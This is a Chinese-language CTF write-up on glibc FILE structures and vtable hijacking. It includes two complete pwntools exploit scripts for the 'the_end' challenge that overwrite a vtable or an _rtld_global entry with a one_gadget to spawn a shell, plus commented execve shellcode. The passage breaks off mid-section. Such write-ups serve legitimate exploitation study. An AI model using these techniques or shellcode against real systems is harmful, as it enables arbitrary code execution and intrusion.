#### 这篇文章是对上一篇的更新，IO_File是很重要的一个环节，学好了对于堆的CTF题目事半功倍，下面进入正题。
#### 一、IO_File结构体一览
首先看一波源码：
    struct _IO_FILE {
      int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
    #define _IO_file_flags _flags
      /* The following pointers correspond to the C++ streambuf protocol. */
      /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
      char* _IO_read_ptr;   /* Current read pointer */
      char* _IO_read_end;   /* End of get area. */
      char* _IO_read_base;  /* Start of putback+get area. */
      char* _IO_write_base; /* Start of put area. */
      char* _IO_write_ptr;  /* Current put pointer. */
      char* _IO_write_end;  /* End of put area. */
      char* _IO_buf_base;   /* Start of reserve area. */
      char* _IO_buf_end;    /* End of reserve area. */
      /* The following fields are used to support backing up and undo. */
      char *_IO_save_base; /* Pointer to start of non-current get area. */
      char *_IO_backup_base;  /* Pointer to first valid character of backup area */
      char *_IO_save_end; /* Pointer to end of non-current get area. */
      struct _IO_marker *_markers;
      struct _IO_FILE *_chain;
      int _fileno;
    #if 0
      int _blksize;
    #else
      int _flags2;
    #endif
      _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */
    #define __HAVE_COLUMN /* temporary */
      /* 1+column number of pbase(); 0 is unknown. */
      unsigned short _cur_column;
      signed char _vtable_offset;
      char _shortbuf[1];
      /*  char* _save_gptr;  char* _save_egptr; */
      _IO_lock_t *_lock;
    #ifdef _IO_USE_OLD_IO_FILE
    };
其实进程中的FILE结构会通过_chain域彼此连接形成一个链表，链表头部用全局变量_IO_list_all表示
，通过这个值我们可以遍历所有的FILE结构。
在标准的I/O库中，stdin、stdout、stderr是在libc.so的数据段的，而且三个文件流是自动打开的
，但是fopen创建的文件流则是在堆中，看下符号长什么样：
    _IO_2_1_stderr_
    _IO_2_1_stdout_
    _IO_2_1_stdin_
但是file结构其实只是一小部分，它有个兄弟叫vtable指针，两人一起同属于_IO_File_plus:
    struct _IO_FILE_plus
    {
        _IO_FILE    file;
        IO_jump_t   *vtable;
    }
    //32位下的偏移是0x94，而64位下偏移是0xd8
在gdb中调试下看看：
Vtable存着哪些可以跳转的函数指针呢？看看
    void * funcs[] = {
       1 NULL, // "extra word"
       2 NULL, // DUMMY
       3 exit, // finish
       4 NULL, // overflow
       5 NULL, // underflow
       6 NULL, // uflow
       7 NULL, // pbackfail
       8 NULL, // xsputn  #printf
       9 NULL, // xsgetn
       10 NULL, // seekoff
       11 NULL, // seekpos
       12 NULL, // setbuf
       13 NULL, // sync
       14 NULL, // doallocate
       15 NULL, // read
       16 NULL, // write
       17 NULL, // seek
       18 pwn,  // close
       19 NULL, // stat
       20 NULL, // showmanyc
       21 NULL, // imbue
    };
这里自己写了个简单的程序去研究：
可以看到一个简单的puts函数，调用的过程是puts——>IO_file_xsputn——>IO_file_overflow——>.........malloc(“666”）——>write输出666
_IO_FILE_plus 结构中存在 vtable，一些函数会取出 vtable 中的指针进行调用。
因此伪造vtable劫持控制流程的思想就是针对_IO_File_plus的vtable动手脚，通过把vtable指向我们控制的内存，并在其中部署函数指针来实现
所以vtable劫持分为2种，一种是直接改写vtable的函数的指针，通过任意地址写就可以实现。另一种是覆盖vtable的指针为我们控制的内存，然后在其中布置函数指针。
#### 二、修改vtable实现控制程序流程：
#### The_end
有点不寻常的题目，肯定是新姿势，close关闭的话就无法再输出信息，但是前面给了sleep的真实地址，所以直接泄露出来得到onegadget，同时我们知道exit会调用_IO_2_1_stdout_的sebuf函数，接着就是任意地址写5字节的操作了（假想
成格式化字符串写地址），具体往哪里写呢，先来看下结构体：
可以看到setbuf的偏移为88，那么我们可以伪造vtable指针和setbuf地址，选取
**IO_2_1_stdout+160作为我们的setbuf的地址，**
IO_2_1_stdout+160-88就是我们的fake_vtable地址，这样我们一共需要填5次，第一次填写vtable的低2位字节，第二次填写onegadget的低3位字节，由于偏移是不变的，所以直接打：
exp:
    #coding=utf8
    from pwn import *
    from libformatstr import FormatStr
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    local = 1
    elf = ELF('./the_end')
    if local:
        p = process('./the_end')
        libc = elf.libc
    else:
        p = remote('116.85.48.105',5005)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    #onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147
    #onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6
    # payload32 = fmtstr_payload(offset ，{xxx_got:system_addr})
    # f = FormatStr(isx64=1)
    # f[0x8048260]=0x45372800
    # f[0x8048260+4]=0x7f20
    # f.payload(7)
    #shellcode = asm(shellcraft.sh())
    #shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
    #shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'
    #shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
    sl = lambda s : p.sendline(s)
    sd = lambda s : p.send(s)
    rc = lambda n : p.recv(n)
    ru = lambda s : p.recvuntil(s)
    ti = lambda : p.interactive()
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
            gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(p,"b *{}".format(hex(addr)))
    def bk(addr):
        gdb.attach(p,"b *"+str(hex(addr)))
    debug(0x000964)
    ru("gift ")
    sleep_addr = int(rc(14),16)
    print "sleep_addr--->" + hex(sleep_addr)
    libc_base = sleep_addr - libc.symbols['sleep']
    onegadget = libc_base + 0xf02a4
    vtable = libc_base + 0x3c56f8
    fake_vtable = vtable - 0x90
    fake_setbuf = fake_vtable + 88
    for i in range(2):
        sd(p64(vtable+i))
        sd(p64(fake_vtable)[i])
    for i in range(3):
        sd(p64(fake_setbuf+i))
        sd(p64(onegadget)[i])
    p.interactive()
调试看看情况，发现成功改写：
其实这题还可以直接利用exit执行_dl_fini:
我们直接往0x7f6086f14f48 (_rtld_global+3848)写入onegadget的4个字节即可 ：
    #coding=utf8
    from pwn import *
    from libformatstr import FormatStr
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    local = 1
    elf = ELF('./the_end')
    if local:
        p = process('./the_end')
        libc = elf.libc
    else:
        p = remote('116.85.48.105',5005)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    #onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147
    #onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6
    # payload32 = fmtstr_payload(offset ，{xxx_got:system_addr})
    # f = FormatStr(isx64=1)
    # f[0x8048260]=0x45372800
    # f[0x8048260+4]=0x7f20
    # f.payload(7)
    #shellcode = asm(shellcraft.sh())
    #shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
    #shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'
    #shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
    sl = lambda s : p.sendline(s)
    sd = lambda s : p.send(s)
    rc = lambda n : p.recv(n)
    ru = lambda s : p.recvuntil(s)
    ti = lambda : p.interactive()
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
            gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(p,"b *{}".format(hex(addr)))
    def bk(addr):
        gdb.attach(p,"b *"+str(hex(addr)))
    debug(0x000964)
    ru("gift ")
    sleep_addr = int(rc(14),16)
    print "sleep_addr--->" + hex(sleep_addr)
    libc_base = sleep_addr - libc.symbols['sleep']
    onegadget = libc_base + 0xf02a4
    vtable = libc_base + 0x3c56f8
    fake_vtable = vtable - 0x90
    fake_setbuf = fake_vtable + 88
    free_hook = libc_base + libc.symbols["__free_hook"]
    fake_got = libc_base + 0x5f0f48
    print "fake_got--->"  + hex(fake_got)
    print "onegadget--->" + hex(onegadget)
    for i in range(5):
        sd(p64(fake_got+i))
        sd(p64(onegadget)[i])
    p.interactive()
总结：这种是通过改vtable指针，通过伪造vtable指针来改变跳转。
#### 三、IO_2_1_stdout_泄露地址
这里得看一波源码才了解具体的原理：
首先得知道puts函数的函数调用链：
我们知道puts函数在源码中是通过_IO_puts函数的内部调用_IO_sputn实现，结果会执行_IO_new_file_xsputn，最终执行_IO_overflow，我们来看下_IO_puts的源码实现：
    int